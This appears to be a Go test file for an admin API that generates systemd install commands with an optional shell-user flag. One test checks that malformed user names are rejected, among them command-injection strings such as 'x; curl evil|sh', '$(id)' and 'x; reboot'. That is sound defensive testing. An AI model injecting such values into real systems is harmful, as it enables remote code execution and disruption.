package admin

import (
	"encoding/json"
	"net/http"
	"strings"
	"testing"
)

func unitExecStart(t *testing.T, systemd string) string {
	t.Helper()
	for _, line := range strings.Split(systemd, "\n") {
		if strings.HasPrefix(line, "ExecStart=") {
			return line
		}
	}
	t.Fatalf("no ExecStart in %q", systemd)
	return ""
}

func TestShellUserShapesTheInstallCommands(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	e.login()

	// Without a user the service opens terminals as itself, as before.
	plain := e.createMachine("plain")
	if exec := unitExecStart(t, plain.Commands.Systemd); strings.Contains(exec, "--shell-user") {
		t.Fatalf("unexpected --shell-user: %s", exec)
	}

	code, body := e.do("POST", "/api/machines", map[string]any{"name": "galaxy", "shell_user": "thiago"})
	if code != http.StatusCreated {
		t.Fatalf("create = %d %s", code, body)
	}
	var created machineCreated
	_ = json.Unmarshal(body, &created)
	exec := unitExecStart(t, created.Commands.Systemd)
	if !strings.HasSuffix(exec, "--shell-user thiago") || !strings.Contains(exec, "--agent-id galaxy") {
		t.Fatalf("ExecStart = %s", exec)
	}
	if strings.Contains(created.Commands.Systemd, "User=") {
		t.Errorf("the unit must run as root, not as the shell user:\n%s", created.Commands.Systemd)
	}
	if strings.Contains(created.Commands.Binary, "--shell-user") {
		t.Errorf("the foreground command is not root, so it must not switch user: %s", created.Commands.Binary)
	}
	if created.Machine.ShellUser != "thiago" {
		t.Fatalf("machine = %+v", created.Machine)
	}

	// A new credential must not lose the user, or the pasted unit would open
	// terminals as root.
	code, body = e.do("POST", "/api/machines/galaxy/rotate", nil)
	var rotated machineCreated
	_ = json.Unmarshal(body, &rotated)
	if code != http.StatusOK || !strings.HasSuffix(unitExecStart(t, rotated.Commands.Systemd), "--shell-user thiago") {
		t.Fatalf("rotate = %d, ExecStart lost the user: %s", code, body)
	}

	// It can be changed and cleared; leaving the field out keeps it.
	code, body = e.do("PUT", "/api/machines/galaxy", map[string]any{"name": "galaxy", "shell_user": "ana"})
	if code != http.StatusOK || !strings.Contains(string(body), `"shell_user":"ana"`) {
		t.Fatalf("update = %d %s", code, body)
	}
	code, body = e.do("PUT", "/api/machines/galaxy", map[string]any{"name": "galaxy renamed"})
	if code != http.StatusOK || !strings.Contains(string(body), `"shell_user":"ana"`) {
		t.Fatalf("an update without the field must keep it: %d %s", code, body)
	}
	code, body = e.do("PUT", "/api/machines/galaxy", map[string]any{"name": "galaxy renamed", "shell_user": ""})
	if code != http.StatusOK || !strings.Contains(string(body), `"shell_user":""`) {
		t.Fatalf("clear = %d %s", code, body)
	}
}

func TestShellUserIsValidatedBeforeAnythingIsCreated(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	e.login()
	for _, bad := range []string{"Root", "x; curl evil|sh", "$(id)", "a b", "../x", "`id`", strings.Repeat("a", 33)} {
		if code, body := e.do("POST", "/api/machines", map[string]any{"name": "m", "shell_user": bad}); code != http.StatusBadRequest {
			t.Errorf("shell_user %q = %d %s, want 400", bad, code, body)
		}
	}
	_, body := e.do("GET", "/api/machines", nil)
	if strings.TrimSpace(string(body)) != "[]" {
		t.Fatalf("a rejected request left machines behind: %s", body)
	}
	e.createMachine("m")
	if code, _ := e.do("PUT", "/api/machines/m", map[string]any{"name": "m", "shell_user": "x; reboot"}); code != http.StatusBadRequest {
		t.Errorf("update with a bad user = %d, want 400", code)
	}
}
